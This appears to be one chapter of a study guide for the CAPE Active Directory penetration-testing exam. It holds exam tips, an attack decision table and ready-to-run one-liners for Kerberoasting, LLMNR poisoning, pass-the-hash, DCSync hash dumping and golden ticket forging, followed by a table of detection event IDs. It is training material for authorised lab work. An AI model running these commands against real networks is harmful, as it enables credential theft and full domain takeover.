# 14 — CAPE Exam Tips & Quick Reference Cheatsheet

[← Back to index](README.md)

## 14.1 CAPE Exam Strategy

> **KEY EXAM TIPS**
>
> CAPE is practical — you need to root multiple machines in an AD environment. Focus on:
> (1) always run BloodHound first, (2) mark owned nodes, (3) follow shortest path queries,
> (4) enumerate every service, (5) think about delegation when you have a service account.

- Start with BloodHound — collect all data immediately after getting credentials
- Mark every compromised user/computer as **Owned** in BloodHound to enable path finding
- Check **Outbound Object Control** and **Transitive Object Control** for every owned node
- Check for delegation on every service account and computer you find
- Run Kerberoasting and AS-REP roasting immediately — crack offline while enumerating
- Look for password reuse across machines and service accounts
- MSSQL linked servers are a common lateral movement path — enumerate all SQL instances
- Always check ACLs on sensitive groups (Domain Admins, Enterprise Admins)
- If you have GenericWrite on a computer → RBCD attack
- If you find an unconstrained delegation host → coerce DC auth via PrinterBug/PetitPotam

## 14.2 Quick Attack Decision Tree

| Condition | Attack Path |
|-----------|-------------|
| User has SPN set | Kerberoast → crack offline → new credentials |
| User has DONT_REQ_PREAUTH | AS-REP roast → crack offline → new credentials |
| Computer has unconstrained delegation | Compromise computer → Coerce DC auth → Capture DC TGT → DCSync |
| Account has constrained delegation | S4U2Self + S4U2Proxy → impersonate Admin to allowed service |
| WriteProperty/GenericWrite on computer | RBCD → create computer account → getST → secretsdump |
| GenericAll on user | Reset password OR add SPN + Kerberoast OR Shadow Credentials |
| GenericAll on group | Add self to group → inherit permissions |
| WriteDACL on domain | Grant DCSync → secretsdump → domain pwned |
| WriteOwner on object | Change owner to self → grant GenericAll → full control |
| ForceChangePassword on user | Change their password → login as them |
| SeBackupPrivilege | Copy NTDS.dit + SYSTEM → secretsdump offline |
| SeImpersonatePrivilege | GodPotato/PrintSpoofer → SYSTEM |
| MSSQL sysadmin | xp_cmdshell → code execution |
| MSSQL linked server | Query chain → eventually reach xp_cmdshell on target |
| Child domain DA | Golden ticket + extra-sid Enterprise Admin → parent domain DA |

## 14.3 Essential One-Liners Cheatsheet

### Initial Access

```bash
# Get domain hash without creds (AS-REP roasting common usernames)
for user in administrator guest krbtgt; do impacket-GetNPUsers $DOMAIN/$user -dc-ip $DC_IP -no-pass 2>/dev/null; done

# LLMNR/NBT-NS poison (run in background throughout engagement)
sudo responder -I eth0 -wfv 2>&1 | tee /tmp/responder.log &

# Crack NTLMv2 hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Enumeration One-Liners

```bash
# All DA members
impacket-net $DOMAIN/$USER:$PASS -dc-ip $DC_IP group member -group 'Domain Admins'

# All Kerberoastable + dump immediately
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerb.txt && hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# All AS-REP-roastable
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile asrep.txt

# All unconstrained delegation
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC_IP

# BloodHound Python quick collect
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All -ns $DC_IP --zip 2>/dev/null
```

### Lateral Movement One-Liners

```bash
# PtH to all machines that have local admin
crackmapexec smb 10.10.10.0/24 -u Administrator -H $HASH --local-auth 2>/dev/null | grep -v FAILURE

# WinRM login
evil-winrm -i $TARGET_IP -u $USER -H $HASH

# PSExec with hash
impacket-psexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH'

# Dump all hashes from DC
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-ntlm -outputfile hashes
```

### Domain Dominance

```bash
# DCSync krbtgt hash
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt

# Golden Ticket
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass $DOMAIN/Administrator@$DC_HOST -just-dc

# Quick SMB access after Golden Ticket
impacket-smbclient -k -no-pass $DOMAIN/Administrator@$DC_HOST
impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC_HOST
```

## 14.4 Key Event IDs for Detection (Know What You Trigger)

| Event ID | Description | Triggered By |
|----------|-------------|--------------|
| 4624 | Successful logon | Any successful authentication |
| 4625 | Failed logon | Password spray, brute force |
| 4648 | Logon with explicit credentials | Runas, impacket tools, PtH |
| 4672 | Special privileges assigned | Admin logons (DA/EA) |
| 4688 | Process creation | Any new process (if audited) |
| 4697 | Service installed | PSExec, service creation |
| 4720 | User account created | Backdoor account creation |
| 4728 | Member added to security group | ACL abuse — add to DA |
| 4732 | Member added to local group | Local admin abuse |
| 4768 | Kerberos TGT requested | Normal login + Golden Ticket use |
| 4769 | Kerberos TGS requested | Kerberoasting (RC4 = type 0x17) |
| 4771 | Kerberos pre-auth failed | Password spray via Kerberos |
| 4776 | NTLM auth attempt | PtH, NTLM auth, spraying |
| 7045 | New service installed | PSExec, impacket-smbexec |
| Directory Service Changes | AD object modified | ACL abuse, group changes, DCSync |

---

> **FINAL EXAM REMINDER**
>
> Document EVERYTHING during the exam. Capture screenshots of flags, credential dumps, and
> privilege escalation proofs. Use BloodHound to mark owned nodes and track progress.
>
> **Common winning path:** valid creds → BloodHound → Kerberoast/AS-REP → crack passwords
> → ACL/delegation abuse → DA → DCSync → Forest compromise.

---

[← Prev: 13 — Defense Evasion & AV Bypass](13-defense-evasion.md) | [Next: 15 — Reference Links →](15-references.md)
